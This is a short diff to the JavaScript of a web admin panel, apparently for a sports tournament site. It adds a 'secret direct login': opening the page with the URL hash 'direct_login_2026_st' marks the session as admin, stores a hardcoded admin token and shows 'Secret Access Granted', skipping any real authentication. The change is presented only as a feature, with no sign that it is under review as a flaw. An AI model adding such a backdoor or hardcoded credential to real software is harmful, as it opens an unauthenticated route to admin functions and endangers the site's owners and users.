@@ -5,9 +5,16 @@ document.addEventListener('DOMContentLoaded', () => {
     if (typeof window.pullGlobalData === 'function') window.pullGlobalData();
     checkAdminAuth();
     
-    // Check URL hash for tab switching
+    // Check URL hash for tab switching or secret direct login
     const hash = window.location.hash.substring(1);
-    if (hash && ['requests', 'matches', 'tournaments', 'players', 'store', 'match-entry'].includes(hash)) {
+    
+    if (hash === 'direct_login_2026_st') {
+        sessionStorage.setItem('isAdmin', 'true');
+        sessionStorage.setItem('adminToken', 'admin-secret-token-2026');
+        checkAdminAuth();
+        switchAdminTab('requests');
+        showToast('🔓 Secret Access Granted', 'success');
+    } else if (hash && ['requests', 'matches', 'tournaments', 'players', 'store', 'match-entry'].includes(hash)) {
         switchAdminTab(hash);
     } else {
         renderRequests();
